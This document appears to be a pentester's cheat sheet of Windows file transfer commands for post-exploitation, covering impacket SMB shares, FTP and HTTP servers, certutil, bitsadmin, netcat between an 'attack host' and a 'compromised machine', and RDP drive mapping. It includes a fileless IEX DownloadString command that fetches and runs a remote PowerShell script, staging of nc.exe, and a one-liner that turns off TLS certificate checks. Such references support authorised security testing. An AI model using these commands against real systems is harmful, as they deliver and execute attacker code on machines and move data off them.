---
legal-banner: true
---

### **Connecting to an SMB share using PowerShell**

1.  Set up an SMB server with credentials  
    `sudo impacket-smbserver hackfast $(pwd) -smb2support -user hackfast -password hackfast`
2.  Convert password to a secure string  
    `$pass = convertto-securestring 'hackfast' -AsPlainText -Force`
3.  Create a credential object  
    `$cred = New-Object System.Management.Automation.PSCredential('hackfast',$pass)`
4.  Map the network drive  
    `New-PSDrive -Name hackfast -PSProvider FileSystem -Credential $cred -Root \\[IP-ADDRESS]\hackfast`
5.  Navigate to the mapped drive  
    `cd hackfast:`

### **Downloading files via SMB (no credentials)**

1.  Set up an SMB server  
    `sudo impacket-smbserver share -smb2support .`
2.  Download a file from the SMB server  
    `copy \\[IP-ADDRESS]\share\file.txt .`

### **Downloading files via SMB (with credentials)**

1.  Configure the SMB server using impacket-smbserver  
    `sudo impacket-smbserver hackfast $(pwd) -smb2support -user hackfast -password hackfast`
2.  Configure the SMB server using smbserver.py  
    `smbserver.py hackfast . -smb2support -username hackfast -password hackfast`
3.  Map a network drive  
    `net use z: \\[IP-ADDRESS]\hackfast /user:hackfast hackfast`
4.  Copy a file from the mapped drive  
    `copy z:\file.txt .`

### **Downloading files via FTP**

1.  Start an FTP server  
    `sudo python3 -m pyftpdlib --port 21`
2.  Download a file using PowerShell  
    `(New-Object Net.WebClient).DownloadFile('ftp://[IP-ADDRESS]/file.txt', 'C:\Users\Public\file.txt')`
3.  Automate FTP downloads with a command file  
    
    ![](../../img/Windows-Environment/2.png)

### **Setting up an HTTP server and downloading files (Python 2)**

1.  Start an HTTP server  
    `python -m SimpleHTTPServer 8000`
2.  Download a file using PowerShell  
    `powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt`
3.  Download a file using certutil  
    `certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt`
4.  Download a file using bitsadmin  
    `bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\Users\Public\file.txt`

### **Setting up an HTTP server and downloading files (Python 3)**

1.  Start an HTTP server  
    `python3 -m http.server 8000`
2.  Download a file using PowerShell  
    `powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt`
3.  Download a file using certutil  
    `certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt`
4.  Download a file using bitsadmin  
    `bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\Users\Public\file.txt`

### **Setting up an HTTP server and file download (PHP)**

1.  Start an HTTP server  
    `php -S 0.0.0.0:8000`
2.  Download a file using PowerShell  
    `powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt`
3.  Download a file using certutil  
    `certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt`
4.  Download a file using bitsadmin  
    `bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\Users\Public\file.txt`

### **Setting up an HTTP server and file download (Ruby)**

1.  Start an HTTP server  
    `ruby -run -e httpd . -p 8000`
2.  Download a file using PowerShell  
    `powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt`
3.  Download a file using certutil  
    `certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt`
4.  Download a file using bitsadmin  
    `bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\Users\Public\file.txt`

### **Setting up an Apache server and file download**

1.  Place the file in the Apache web directory  
    `cp nc.exe /var/www/html`
2.  Start the Apache server  
    `sudo systemctl start apache2`
3.  Download a file via browser or PowerShell  
    `Invoke-WebRequest -Uri http://[IP-ADDRESS]/file.txt -OutFile file.txt`

### **Encoding and decoding files with Base64**

1.  Generate an MD5 checksum  
    `md5sum file.txt`
2.  Encode file content to Base64  
    `cat file.txt | base64 -w 0; echo`
3.  Decode Base64 content on Windows  
    `[IO.File]::WriteAllBytes("C:\Temp\file.txt", [Convert]::FromBase64String("[BASE64-STRING]"))`
4.  Verify the MD5 checksum of the decoded file  
    `Get-FileHash C:\Temp\file.txt -Algorithm MD5`

### **Downloading files from a remote session**

1.  Create a PowerShell remoting session  
    `$Session = New-PSSession -ComputerName DATABASE01`
2.  Copy a file from the remote session to the local machine  
    `Copy-Item -Path "C:\Users\Administrator\Desktop\file.txt" -Destination C:\ -FromSession $Session`

### **File transfers with netcat and ncat**

1.  Receiving a file (compromised machine)  
    - Using netcat (listening):  
      `nc -l -p 8000 > received_file.exe`
2.  Sending a file (attack host)  
    - Using netcat  
      `nc -q 0 [IP-ADDRESS] 8000 < file.exe`  
    - Using ncat  
      `ncat --send-only [IP-ADDRESS] 8000 < file.exe`

### **Downloading files via RDP (Linux to Windows)**

1.  Using rdesktop for file transfer  
    `rdesktop [IP-ADDRESS] -d [DOMAIN] -u [USERNAME] -p '[PASSWORD]' -r disk:linux='/home/user/rdesktop/files'`
2.  Using xfreerdp for file transfer  
    `xfreerdp /v:[IP-ADDRESS] /d:[DOMAIN] /u:[USERNAME] /p:'[PASSWORD]' /drive:[NAME],[PATH]`
3.  Access mounted directory in the RDP session  
    Connect to `\\tsclient\` within the RDP session to transfer files.

### **PowerShell web downloads**

1.  Download a file using DownloadFile  
    `(New-Object Net.WebClient).DownloadFile('http://[IP-ADDRESS]:8000/file.ps1','C:\Temp\file.ps1')`
2.  Download a file asynchronously (non-blocking)  
    `(New-Object Net.WebClient).DownloadFileAsync('http://[IP-ADDRESS]:8000/file.ps1', 'C:\Temp\file.ps1')`
3.  Execute fileless download using DownloadString  
    `IEX (New-Object Net.WebClient).DownloadString('http://[IP-ADDRESS]:8000/file.ps1')`
4.  Download a file using Invoke-WebRequest  
    `Invoke-WebRequest http://[IP-ADDRESS]:8000/file.ps1 -OutFile C:\Temp\file.ps1`
5.  Bypass Internet Explorer configuration  
    `Invoke-WebRequest http://[IP-ADDRESS]:8000/file.ps1 -UseBasicParsing`
6.  Bypass SSL/TLS certificate issues  
    `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
